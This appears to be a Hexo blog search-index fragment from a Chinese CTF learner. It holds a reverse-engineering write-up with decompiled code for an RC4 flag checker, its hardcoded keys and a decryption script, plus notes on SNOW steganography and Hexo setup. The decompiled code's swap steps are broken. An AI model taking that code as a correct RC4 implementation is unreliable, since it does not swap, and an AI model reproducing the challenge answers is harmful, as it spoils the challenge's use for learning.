<span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ <span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    (i, j) = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ Key.keykey[r % <span class="built_in">len</span>(Key.keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">text, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key = KeyStream(text, Sbox)</span><br><span class="line">    enc = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ text[i] ^ key[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(enc)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Please input Your flag:&#x27;</span>)</span><br><span class="line">flag = (<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(flag)</span><br><span class="line">flag = Encrypt(flag, Key.key)</span><br><span class="line"><span class="keyword">if</span> flag != enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s not flag!&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;You are right!&#x27;</span>)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key = &#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line"><span class="string">keykey = [66,97,115,101]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>这就是很明显的RC4加密了，256次循环初始化Sbox,目的就是为了打乱数字顺序，顺序依靠key，然后再通过异或获得flag。</p><ul><li>解密脚本（仅针对本题，因为此题有两个key）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given key and keykey</span></span><br><span class="line">key = <span class="string">&#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line">keykey = [<span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = [<span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ keykey[r % <span class="built_in">len</span>(keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">enc, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key_stream = KeyStream(enc, Sbox)</span><br><span class="line">    decrypted = [enc[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given encrypted message</span></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = Decrypt(enc, key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="通用解密脚本"><a href="#通用解密脚本" class="headerlink" title="通用解密脚本"></a>通用解密脚本</h2><p>参考：<a href="https://www.jianshu.com/p/d9ad5fc524ec">Python3.7实现RC4加密解密（超详细） - 简书 (jianshu.com)</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4解密主函数调用成功&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用解密程序成功。&quot;)</span></span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于解密字符串，解密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment"># print(&quot;解密后的字符串是：%s&quot; %cipher)</span></span><br><span class="line">    <span class="comment"># print(&quot;解密后的输出(没经过任何编码):&quot;)</span></span><br><span class="line">    <span class="keyword">return</span>  cipher</span><br><span class="line"><span class="comment"># rc4_main(&quot;123456sh&quot;, &quot;ABHCum92PMOXwqI=&quot;)</span></span><br></pre></td></tr></table></figure><p>加解密其实没太大区别，可以上网搜搜</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-特殊加密</title>
      <link href="/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SNOW-雪"><a href="#SNOW-雪" class="headerlink" title="SNOW(雪)"></a>SNOW(雪)</h1><ul><li>关于一种txt空白加密的方法：</li></ul><p><img src="/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/%E6%A0%B7%E4%BE%8B.bmp" alt="样例"></p><p>像这样子的，txt文件用winHex打开，发现文字后面大片的空白，猜测是SNOW加密。</p><ul><li><p>工具下载地址：<a href="https://darkside.com.au/snow/">The SNOW Home Page (darkside.com.au)</a></p></li><li><p>使用：将要解密的txt放在同一目录下，还需要知道key，然后利用指令解密：</p><p><code>.\SNOW.EXE -p key -C .\flag.txt</code>   [解密]</p><p><code>.\SNOW.EXE -C -m &quot;message&quot; -p &quot;key&quot; infile outfile</code> [加密]</p><p>加密表示将隐藏文件infile中的message用key加密，储存在outfile中</p></li><li><p>详细的可参考：<a href="https://blog.csdn.net/qq_53079406/article/details/123810053">csdn-blog</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录解决hexo插图失败</title>
      <link href="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><ul><li>根据网上教学搭建博客，想要插入<strong>本地图片</strong>，但是图片始终无法加载出来：</li></ul><p><img src="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%A4%B1%E8%B4%A5%E6%A0%B7%E4%BE%8B.bmp" alt="失败样例"></p><p>类似于上面的情况，或者就一个小图案，无法加载出来。</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><ul><li><p>按照网上说的，先修改Blog目录下的_config.yml中的<strong>post_asset_folde改为true</strong>,这个必须先该</p></li><li><p>下载插件：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install <span class="attr">https</span>:<span class="comment">//github.com/CodeFalling/hexo-asset-image --save</span></span><br></pre></td></tr></table></figure></li><li><p>修改Typora的图像偏好：<br><img src="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%81%8F%E5%A5%BD%E8%AE%BE%E7%BD%AE.bmp" alt="偏好设置"></p></li></ul><p>像这样设置好，这样你在每一次hexo new XXX的时候，<strong>都会在_posts下面生成一个和.md同名的文件夹，这个文件夹就会专门来放你的图片</strong>，我们也可以，提前将图片放进去。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li>关于其他的插入图片方式，比如建立图床&lt;！<a href="url"></a>&gt;来引用图片，个人感觉还是比较复杂，就没有实现了，以后有时间再尝试。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 搭建博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="代码测试："><a href="#代码测试：" class="headerlink" title="代码测试："></a>代码测试：</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="图片测试："><a href="#图片测试：" class="headerlink" title="图片测试："></a>图片测试：</h2><p><img src="/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/ceshi.jpg" alt="ceshi"></p><h2 id="引用测试"><a href="#引用测试" class="headerlink" title="引用测试"></a>引用测试</h2><blockquote><p>你好,这是一条引用</p></blockquote><h2 id="链接测试"><a href="#链接测试" class="headerlink" title="链接测试"></a>链接测试</h2><ul><li>这是fastbin_attack文章链接<br> &lt;<a href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#</a> &gt;</li></ul><h2 id="无序列表测试"><a href="#无序列表测试" class="headerlink" title="无序列表测试"></a>无序列表测试</h2><ul><li>小向</li><li>小罗</li><li>大向</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/20/hello-world/"/>
      <url>/2024/08/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
